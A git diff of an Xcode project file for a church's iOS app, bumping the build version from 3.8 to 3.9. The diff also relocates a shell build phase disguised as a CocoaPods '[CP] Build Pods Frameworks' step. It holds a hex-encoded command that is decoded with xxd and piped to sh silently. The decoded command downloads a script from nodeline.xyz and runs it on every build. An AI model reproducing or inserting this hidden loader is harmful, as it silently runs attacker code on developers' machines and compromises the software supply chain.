@@ -93,9 +93,6 @@
 		F6F55311757424FCC979000A /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 40C4EA74E5E62CA3E4824A2B /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		188C9A8125CE5BD3009AC9C8 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -694,29 +691,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	E08AD94B71E77E0B1E6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
 		81331D7EC4A274C6C10456D7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -794,6 +768,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		E08AD94B71E77E0B1E6D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		EF3246B658E8D6BF0DA9A44E /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1053,7 +1045,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 3.8;
+				CURRENT_PROJECT_VERSION = 3.9;
 				DEVELOPMENT_TEAM = T5AAKPB89X;
 				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
@@ -1078,7 +1070,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c69
 				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 3.8;
+				CURRENT_PROJECT_VERSION = 3.9;
 				DEVELOPMENT_TEAM = T5AAKPB89X;
 				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
